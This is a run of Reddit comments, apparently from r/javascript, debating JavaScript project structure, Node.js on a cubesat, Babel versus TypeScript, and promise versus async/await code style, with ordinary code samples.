&gt; Rule 1 - Organize your Files Around Features, Not Roles This works only for limited type of projects, file structures, e.g. MVC. &gt; Rule 2 - Don't Put Logic in index.js Files Agreed. However, the method used to re-export method will break if the exported function is a property of an object instance. You need to either bind the method or wrap it in another function call (which is the same as the former). &gt; Rule 3 - Place Your Test Files Next to The Implementation Not convinced. References to research, other sources that support this? &gt; Rule 4 - Use a config Directory What ... What is the argument? Don't just tell me to do something. Argument your reason for making the suggestion. &gt; Rule 5 - Put Your Long npm Scripts in a scripts Directory Whoever is writing this has no experience with code for cross-platform deployments. However, I agree that it is a fairly rare requirement.
Programming isn't about learning one language and then applying it to everything. It's about using your first language to learn the principles of software engineering. Soon enough, you can apply almost any language with a small amount of ramping up. Node is a great tool in the toolbox, but this concept of enabling a "JavaScript developer" to do anything is a bit of a culture smell to me. Expand your horizons well beyond JavaScript. It's *really* not that hard.
The next leftpad fuckup can drop large metal chunks on your head.
&gt; We've already managed to do that in the aviation industry and that helped our customer to create a better in flight experience for their customers. Was that in any context other than entertainment devices? Based on the article that seems to be the situation.
There's no reason not to just use a better language for the job. Especially when you introduce triple redundancy as magic space pixies will flip bits on you at random, which generally isn't an issue on Earth.
Of course not. Node.js is no more appropriate for terrestrial avionics than it is for space-based software. 
Not really. Even relatively large satellites burn up on reentry. And this is a cubesat, which by definition is at most 4kg (8.8lbs), and are very small. There's no way that these would make it through the atmosphere intact, unless they had the ability to totally stop their forward momentum and slowly descend vertically. Which they don't. There's actually a pretty strict [specification document](http://static1.squarespace.com/static/5418c831e4b0fa4ecac1bacd/t/56e9b62337013b6c063a655a/1458157095454/cds_rev13_final2.pdf) (warning: PDF), and the [Wikipedia page](https://en.wikipedia.org/wiki/CubeSat#Design) is quite informative, if you want to learn more.
Well, you are assuming the antenna is the main comms disc or something. There may be a whole range of other antennas or instruments on a satellite. You are also assuming that there is no fallback procedure in the satellite software, overriding whatever states caused by any scripts that have been running.
I am under the impression that the bit flipping can largely be handled in hardware and/or compiler/runtime features, so that a high-level programming language can be used transparently, albeit at a performance hit. But I'm really just speculating.. would be interesting to know for sure.
Nice! Thanks!
Wow, this is the most extreme example of [atwood's law](http://blog.codinghorror.com/the-principle-of-least-power/) I've seen in a long time.
Agreed on all counts. I worked at a place where we put the tests next to the code, and it was a mess.
&gt;Node is a great tool in the toolbox, but this concept of enabling a "JavaScript developer" to do anything is a bit of a culture smell to me. This is an interesting one to me. Talk to a C or C++ programmer and you'll hear about how C or C++ can be used literally anywhere, which is a good thing. A tool is more valuable the more often you can use it. We shouldn't discredit new novel uses of javascript just because they're new and novel. I think the thing to discourage is the people who only see nails everywhere because they just picked up a hammer. C isn't a worse tool because you can write web servers in it, neither is the culture of C worse because it's possible; someone is a worse developer if they write a web server in it due to their inflexibility to learn outside of C.
Any popular languages will have its haters. It's just that js gives a lot of valid reasons for its haters.
Try answering few question in SO too. That will definitely help!
There's always `NodeList.js`(https://github.com/eorroe/NodeList.js) :)
TypeScript will look at your code and tell you if you might be doing something stupidâ€”e.g. adding a string and a number. Babel will just make your code more backwards compatible.
I appreciate you pointing that out. I did the naive thing and said "Wow the performance difference is massive". Wasn't until I came and read this comment that I went back and looked more closely. 
Let's say only 1% of programmers can meet the requirements of writing code in this high-demand environment. Would you prefer that 1% be further hampered by needing to know assembly? My perspective is that they are widening the net to get more people who can deal with this high correctness of code. While I assume a lot programmers would be *able* to learn something like FORTRAN, that doesn't mean they'd *want* to.
Hi /u/royvanrijn, this post was removed. Please see our [posting guidelines](http://www.reddit.com/r/javascript/wiki/index) (specifically, _Posting: Showing off a Project_). Please use the [Showoff Saturday](https://www.reddit.com/r/javascript/search?sort=new&amp;restrict_sr=on&amp;q=flair%3AShowoff%2BSaturday) posts for these types of submissions.
So it's like +1 to my "simply greater than babel". Thanks!
Hi Kenman. Sorry, may I ask you why it was removed? I checked the post guidelines and it looks alright. The bundle I linked has also Javascript/AngularJS courses so I thought it could have been of some use for the subreddit?
I've heard that a lot of times, but I don't like. I would rather say that learning a language will help you with other languages who share the same programming paradigm. If you start with java python or C# won't be much trouble, but there will be much less carry over to languages like clojure or haskell.
If you compare https://github.com/angular/angular-seed#directory-layout with my https://github.com/geniuscarrier/webpack-angular-es6#folder-structure, it is the "horizontal modules" to me.
&gt; If you advertise or promote a paid product or service, or a site which you would in some way benefit financially, then please be aware of reddit.com/advertising. 
You are probably asking ES6 vs Flow vs TypeScript, instead of Babel vs TypeScript: * TypeScript is a language with a compiler, the language offers a type system. * Babel is just a compiler. It can be used to compile ES6 or Flow. Depends on the style of OOP code you write. If you write classical statically typed OOP, then having a type system would help you quite a bit. If you are writing mixin-style OOP code, then the type system might get in the way. 
Hi wreckedadvent, It would be my next modification, however already fixed. Still need to refactor some things, it was made fast and when I was learning then still have significant improvements in the coming months
Isn't babel with a preset pretty much a middle ground? 
Well, you made it pretty close to the end, so I can't complain about that :)
No, I consider &gt; What would happen if everyone with a normal driverâ€™s license could fly an airplane just as safely and smoothly as a professional pilot? ... This combination is quite literally a programmerâ€™s universal driverâ€™s license. to be on the level of bullshit buzzwords, not the mention of node itself. Drivers can scarcely drive their normal cars without killing and injuring hundreds of thousands every year, and really the only unfair point of comparison here is that javascript devs don't kill people when their websites topple over.
What about that is eye-roll-worthy, exactly? I think it's a valid point, if phrased a little dramatically. 
Space junk is a very real problem, I don't see how they believe launching thousands of tiny CubeSat's is a good idea.
Hi, this is Juho from the satellite team. We are going to use nodejs in our satellite, because we believe that it's a tool that can make writing software to space more accessible. In our satellite we have a "flight computer", which is running FreeRTOS and the software needed to keep the satellite alive and responsive. Then we have another significantly more powerful "payload computer", which is running minimal linux. The payload computer then has "platform" software, which the different runtimes like nodejs can access through APIs. So basically we are experimenting with a platform for accessing the different sensors the satellite might have and making it possible to write the "business logic" of collecting and processing the sensor data with another language the platform is written in.
&gt; Control flow can be awkward. In order to keep the chain alive, each step has to be thenable. Reading pixels from the image is a synchronous activity, but I canâ€™t easily slip it into the chain without wrapping it in a promise. My solution here â€” wrapping it in a function, and using Promise.all â€” feels clumsy, but I canâ€™t find a more elegant solution. You'll be surprised to know that: a) values returned by .then are converted to Promises anyway, so you don't need to do it manually; b) even if you need to turn a value into promise and immediately return it (say outside of .then), there is a nice shorthand: Promise.resolve(value), i.e. you can do this: Promise.resolve(value).then((value) =&gt; {}); 
I think there are some serious problems going on if promises are adding "mental hoops to keep track of what's going on". I also, in general, just find the argument of "javascript is only finally good now that x language feature was added" very tiring. Furthermore, your promise example is a little odd, with lots of inline calls. app.post('/process-upload', upload.single('image'), (req, res) =&gt; { // Kick off our promise chain by reading the supplied file. readFilePromise(req.file.path) .then(originalFileBuffer =&gt; ( // Return our resize-and-convert promise, so the chain can continue imageMagickConvertPromise({ srcData: originalFileBuffer, width: 32, height: 16, format: 'PNG' }) )).then(smallFileBuffer =&gt; ( // We need to do two simultaneous actions with this buffer; // read the pixels, and write the .png to disk Promise.all([ readPixelsFromImage(smallFileBuffer), writeFilePromise(getPathForNewFile(req.file), smallFileBuffer) ]) )).then( ([pixels]) =&gt; { // Finally, we're done. The `pixels` parameter is deconstructed // from the returned array from Promise.all. res.json({ done: true, pixels }) }).catch(err =&gt; { throw err }); // Wrap our read-pixels logic in a function so it can fit nicely // in the Promise chain. function readPixelsFromImage(srcData) { return imageMagick.getConstPixels({ srcData, x: 0, y: 0, columns: 32, rows: 16 }); }; }); Just moving them out to named functions greatly improves legibility, particularly in comparison to your async/await. This is aside the unusual `Promise.all` or anything else - all I did was pull it out into named functions. =&gt; const resizeImage = srcData =&gt; imageMagickConvertPromise({ srcData, width: 32, height: 16 format: 'PNG' }); const readPixelsFromImage = srcData =&gt; imageMagick.getConstPixels({ srcData, x: 0, y: 0, columns: 32, rows: 16 }); const readAndWriteToFile = file =&gt; smallFileBuffer =&gt; Promise.all([ readPixelsFromImage(smallFileBuffer), writeFilePromise(getPathForNewFile(file), smallFileBuffer) }) .then([pixels] =&gt; pixels); const convertToResponse = res =&gt; pixels =&gt; res.json({ pixels, done: true }) app.post('/process-upload', upload.single('image'), (req, res) =&gt; readFilePromise(req.file.path) .then(resizeImage) .then(readAndWriteToFile(req.file)) .then(convertToResponse(res)) .catch(err =&gt; { throw err }) ); I also found it pretty disingenuous to load up your promise code with comments and format it all as one huge blob with no new lines, while the async/await one has much more line breaks and no comments. Of course it reads better! The only thing you could have done to make the promise code look *worse* was to use comic sans or something. :) Also, whenever someone says "promises cause silent failures" I die a little inside.
&gt; If your argument is that strong typing and enforced encapsulation are good things, then I agree. It's better to catch mistakes at compile time than at runtime. I was talking about weak typing vs strong typing, not dynamic typing vs static typing. Smalltalk is a dynamically and strongly typed language, whereas JavaScript is a dynamically and weakly typed language. (Nearly all statically-typed languages are strongly typed.) It is widely recognized that weak typing is bad (*despite any benefits it may have*), which is why you rarely see it. This was one of Brendan Eich's bad ideas. Dynamic vs static typing is a very controversial topic. I happen to take a balanced view on this, which everyone should do. Dynamically-typed languages have their pros and cons, as do statically-typed languages. It just depends on what your goals are (your goals should never be static for all situations). Clearly, dynamically-typed languages are immensely popular *for good reasons*. Six of the Top Ten languages at [IEEE Spectrum](http://spectrum.ieee.org/computing/software/the-2015-top-ten-programming-languages) are dynamic! Two of the hottest new languages are dynamic: **Julia** and **Elixir**. My favourite dynamic language, Smalltalk, has been used to write a *million-line* battle simulation program for the U.S. joint military called JWARS, all without the benefit of static typing. Dynamically-typed languages are extremely capable, and highly valued for their productive nature. Having said that, I like statically-typed languages, too; Go is my favourite in this category, C has been the primary language of my long IT career, and Swift intrigues me.
&gt;There are only two kinds of [programming] languages: the ones people complain about and the ones nobody uses.
Luckily I recently discovered the arguments variable; this all makes sense. Thanks for the helpful comment! 
You have some fair points here. Could do without being told I have serious problems, but that's what you get for sharing something on Reddit, I suppose. For the record: - I never said Javascript wasn't good before Async/Await. I happen to love Javascript! I'm just excited about a new feature that (IMO) offers substantial improvement. - I didn't mean that callbacks or promises are incomprehensibly difficult, just that there's an added mental overhead that comes from code that can run non-linearly. It's an overhead I've gotten used to, but that doesn't stop me from admiring code that does away with it. - Your example is indeed nicer! And perhaps it was unfair of me to structure the examples the way I did. For a contrived example like this, though, extracting a bunch of methods feels over-engineered, especially when it can be done so cleanly inline with async/await. I will definitely fix the spacing, though; thanks for pointing that out. - I'm happy to admit that I don't use promises often (I mostly use Caolan's Async lib), so maybe I shouldn't try to preach about something I don't know inside and out. I'm just a regular developer sharing my experiences, though; shouldn't be taken as gospel.
To be clear, I didn't mean *you* had serious problems, just that if the result is that promises add that mental over head, there are serious problems *somewhere*, like working with a team that has has a low understanding of javascript or async code. &gt;extracting a bunch of methods feels over-engineered, especially when it can be done so cleanly inline with async/await. To me, this is the difference between self-documenting code or not, though. The inline async/await is more simple to write, but a lot less comprehensible from a distance. The named functions provide the necessary context for immediate comprehension. 
Ah, my mistake! Yeah, I'm coming around to seeing what you mean. In my mind, the method names being used in the async/await were clear enough on their own, but after getting some distance from them, I can see that yeah, they really aren't. Thanks :) 
I don't think so. If you compare it to something like typescript (which also has to down step ES6), it's basically night and day. You install typescript, you type `tsc`, potentially passing in a file, and you're done. If you need to change some compile options, you can make a config file, but that's by no means necessary. It has *sensible defaults* so that you don't need to configure the 99% of the use case people are using it for, which babel intentionally avoids.
JavaScript in a satellite? Can't wait :D http://hackaday.com/2016/05/02/software-update-destroys-286-million-japanese-satellite/
Each component is a different module as is each view. There are no "app.controllers", "app.services" modules. I assume you got that information from [here](http://meanjs.org/docs/0.3.x/), but that's outdated.
I recently made a reddit api thing. https://github.com/SarahDunlap/reddit_api
/r/atwoodslaw 
[removed]
I started my career as an embedded C programmer. I've never heard or espoused the idea that C is a good choice everywhere. Make was used in every C project that I worked on and I would also use Tcl for both testing (with Expect) and to glue together low level functions written in C. Again, I've literally never seen the Highlander (there can be only one) attitude in any developer community other than Javascript. Actually, I take that back. I've also seen this attitude among Clojure developers. And, [we all know how many successful projects are written in Lisp](http://www.winestockwebdesign.com/Essays/Lisp_Curse.html).
Just for reference, in Webpack this is trivial to set up. This one gives you full ES6 + stage 0 (async/await and more), hot reload (compile-on-save), source maps and on top of it you can use any npm module you like. webpack.config.js module.exports = { entry: './index.js', output: { publicPath: '/', path: __dirname, filename: 'bundle.js' }, module: { loaders: [{ test: /\.js$/, exclude: /(node_modules|bower_components)/, loader: 'babel-loader', query: { cacheDirectory: true, presets: ['es2015-loose', 'stage-0'], plugins: ['transform-runtime'] } }] }, devServer: { contentBase: './' }, devtool: 'source-map' }; index.js import delay from 'delay'; import 'requestidlecallback'; requestIdleCallback( async () =&gt; { await delay(1000); console.log('full es6 + async/await'); }); 'webpack-dev-server --inline --hot' for hot module reloading under localhost:8080
Can you provide any source to prove that space junk is indeed real problem? We don't hear about people being hurt or property destroyed by falling things from Earth's orbit nor we do see anything on sky with telescopes. I think many space junk is simply falling towards Earth and burning. Only problem I see is very small risk of accidental collisions with other working satellites, but there are so many possibilities to place them that with proper overseeing by some international organization risk is non-existent.
Well, I didn't say that C or C++ programmers said you *should* use C or C++ everywhere, or even that it was a good choice to. Just that it can be used anywhere; it's a tool with a wide berth. If your circles don't talk about portability of C, then they're quite different from mine, I'll have to say. 
A fractal of interpretation.
They have one thing in common though, it costs a ton of money to put up there and nobody can fix it if it goes down.
http://www.nasa.gov/mission_pages/station/news/orbital_debris.html &gt; â€œThe greatest risk to space missions comes from non-trackable debris,â€ said Nicholas Johnson, NASA chief scientist for orbital debris.
It's about programming a space _craft_. Something that will have people inside. Something that - if it fails - may kill these people. We are not talking about programmings space ships here. We are talking about unmanned satellites.
I absolutely see no reason why such satellite couldn't try to automatically try to reconnect, even by going back to last successful antenna position. This can be done fully without user input.
Isn't that what buble does? 
&gt; but JS is great starting point for young people Javascript is by far not the best language for beginners (not sure what "young people" means but I guess that's what you were trying to say). Arguably one of the worst languages for beginners. And I'm saying this as a Javascript developer.
That's solid argument. But still, we ultimately have to find a way to deal with it, because more and more nations will start their own space programs and we can only slow down aggregation of space debris.
It will ultimately cost less and less money and with proper software it can fix itself if it's not physically damaged - software on deeper level than that of end user program.
Not bad, but less comfortable than the native picker on iOS, and that's probably true for other platforms as well.
Flying Spaghetti ... Monster!
Also to add on, you can define in the scope above this to another variable; e.g. var SomeClass = function() { var _this = this; this.someFunction = function() { return _this; }; }; var aClone = new SomeClass(); console.log(aClone.someFunction()); However, the main thing to keep in mind when you're truly trying to create classes within JavaScript (or I should say - mimic them similar to how C++ or other OOP languages function), then you should truly invest in the .prototype model/functionality (don't try to imbed all your functions under your model class, even though I know it may seem nice from a management perspective). The main reason here is prototype ensures the sharing of functions with unique values among each class, whereas if you embed commonly used functions among all your instances of classes than you are bogging down your memory further with repeated clones of the same function over and over. This is how I would manage classes: var aClass = function() {} aClass.prototype.init = function() { this.test = Math.random(); } var test = new aClass(); var test2 = new aClass(); test.init(); test2.init(); console.log(test); console.log(test2); Also, the better way to manage these would be an array of objects as opposed to new variables - e.g. var currentClasses = []; currentClasses.push(new aClass()); // and when you want to remove one... delete currentClasses[indexToDelete]; 
Any custom getter will let you do that. var be = { get false () { console.log('falsed!'); } }; be.false; // falsed! https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/get
So we build a swarm of killer satellites powered by JavaScript and lease orbital space to those that pay. That's a lovely communications satellite. It would be a shame if mysterious space lasers vaporized it.
*F*unctional *R*eactive *P*rogramming. It's a little buzz-word-y for describing things like [RxJs](https://github.com/Reactive-Extensions/RxJS). The idea is, basically, you map and project over events like you would arrays and other data, usually non-concurrent asynchronous data streams. 
Javascript is neither broken nor incomplete. Your understanding of it may be what's broken or incomplete.
Cause: 1) Many JS libraries are not of equal quality to other beginner languages' libraries 2) There are many gotchas and specific problems related to the design of the language 3) It isn't always that easy (at all) to get node to install 4) It doesn't do functional programming or OOP in an easy-to-grasp way. 5) It isn't strongly-types Plus: 1) Typing is good, and isn't hard for beginners to understand, so it isn't a benefit to not have types 2) Lots of languages are easier to set up than that (Python, C, Go, etc) 3) JavaScript does not offer anything that other beginner languages also do not offer
I love to program as much as anyone, but if you think any computer code is *beautiful*, you should have your head examined.
Nodejs is based on C++, so your assumption is very wrong.
What's broken is that what's implemented is different on each browser. You have either an incomplete feature set or you have to transpile things to ensure your software runs the same on different browsers. Incomplete is the lack of a decent standard library and still no solid module support, requiring that you tool up a build story and get pad-lefted because of the countless dependencies that exist due to the lack of standard library. Maybe it's unfair to compare it to Python, but JavaScript has always felt incomplete.
Saw your talk at ng-conf and immediately told my company we were wasting our time not using TypeScript. Thanks for the info. 
There are a bunch of inconsistencies in JavaScript that really don't make sense and the fact that it has really aggressive type coersion can lead to a bunch of bugs. There are plenty of different articles explaining some of the terrible things about JavaScript but here's a good article: https://whydoesitsuck.com/why-does-javascript-suck/ One thing that really exhibits the terribleness is the fact that: {} + [] !== [] + {} You can't seriously think that the above example is sanely parsed can you?
Fair enough. So JavaScript still doesn't support modules. Stepping back for a moment, I apologize. This is a failure on my part because I made an assertion but don't have the time or energy to debate it. That just makes this comment-chain more noise than signal and I apologize for that. I appreciate your disagreement and while I still believe you're wrong, I cannot commit more to debating it. Thanks for your opinions though! =)
I'd argue that having types is crucial for beginners learning correctly.
You could say this about a lot of languages. * Install Python * Open any text editor * Type "x = 5; print (x * x);" * Save File as 'program.py' * Run in console 'python program.py' Javascript is not a very good language for beginners because it does not teach many of the fundamentals of programming that other languages can. There are no object types in JS (what type of object is this?) and, in general, relatively few primitive types. There's hardly a notion of OOP or polymophism, or memory management. [You'll never know what a stack overflow is.](http://www.techrepublic.com/article/joel-spolsky-the-three-skills-every-software-developer-should-learn/) The language simple does not force the developer to go through the paces that another language might. Until you have to dynamically manage the memory your arrays sit in, you likely do not have insight into how the computer physically runs your code. Just because it is convenient to setup a development environment does not make it an idea starter language. The culture of javascript does make it easy to pick up but it is not one that will make you a competent developer. 
Pre-fetching data when the user moves the mouse near a button? Now that's a cool idea.
Thank you! can you please show me an example? I don't quite understand what to do.
In this case, the space craft was New Horizons, which just zoomed past Pluto last year, so definitely unmanned. We send out many unmanned space craft.